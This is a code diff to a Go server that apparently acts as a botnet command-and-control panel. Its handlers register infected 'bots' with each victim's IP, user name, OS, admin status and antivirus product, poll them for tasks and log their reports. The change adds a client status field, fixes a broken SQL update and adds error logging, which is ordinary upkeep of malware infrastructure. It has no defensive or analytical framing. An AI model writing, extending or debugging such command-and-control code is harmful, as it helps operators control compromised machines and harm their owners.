@@ -131,10 +131,10 @@ func recovery_handler(w http.ResponseWriter, r *http.Request) {
 	err := db1.QueryRow(common.Db, strSql, guid).Scan(&out_guid, &out_token)
 	if err == sql.ErrNoRows {
 		// No such bot, create bot
-		strSql = "insert into clients (guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen) values(?,?,?,?,?,?,?,?,?,?,?,?)"
+		strSql = "insert into clients (guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen, status) values(?,?,?,?,?,?,?,?,?,?,?,?,?)"
 		// Generate new token
 		out_token = common.Base64Enc(utils.GenerateRandomBytes(32))
-		_, err = db1.Insert(common.Db, strSql, guid, out_token, bot.Ip, bot.Whoami, bot.Os, utils.TimestampStringToMySqlDateTime(bot.Installdate), bot.Isadmin, bot.Antivirus, bot.Cpuinfo, bot.Gpuinfo, bot.Version, utils.TimestampStringToMySqlDateTime(time1))
+		_, err = db1.Insert(common.Db, strSql, guid, out_token, bot.Ip, bot.Whoami, bot.Os, utils.TimestampStringToMySqlDateTime(bot.Installdate), bot.Isadmin, bot.Antivirus, bot.Cpuinfo, bot.Gpuinfo, bot.Version, utils.TimestampStringToMySqlDateTime(time1), "active")
 		if err != nil {
 			// Failed to create a bot
 			reply.Status = 0
@@ -203,9 +203,11 @@ func poll_handler(w http.ResponseWriter, r *http.Request) {
 	reply.TaskId = 0
 
 	// Update the status of clients and clients_archived
-	sqlStr := "update clients set status='active' lastseen=? where guid=? and status <> 'active'"
-	db1.Exec(common.Db, sqlStr, utils.TimestampStringToMySqlDateTime(time1), guid)
-
+	sqlStr := "update clients set status='active', lastseen=? where guid=?"
+	_, err := db1.Exec(common.Db, sqlStr, utils.TimestampStringToMySqlDateTime(time1), guid)
+	if err != nil {
+		log.Println("db1.Exec err: ", err.Error())
+	}
 	// Clients_archived
 	tx, err := common.Db.Begin()
 	if err != nil {
@@ -361,7 +363,7 @@ func report_handler(w http.ResponseWriter, r *http.Request) {
 		log.Printf("[-] Failed to add task[%s] log\n", report.TaskID)
 		return
 	}
-	fmt.Println("[+] New task log generated")
+	fmt.Print("[+] New task log generated\n$ ")
 }
 
 func Server() {
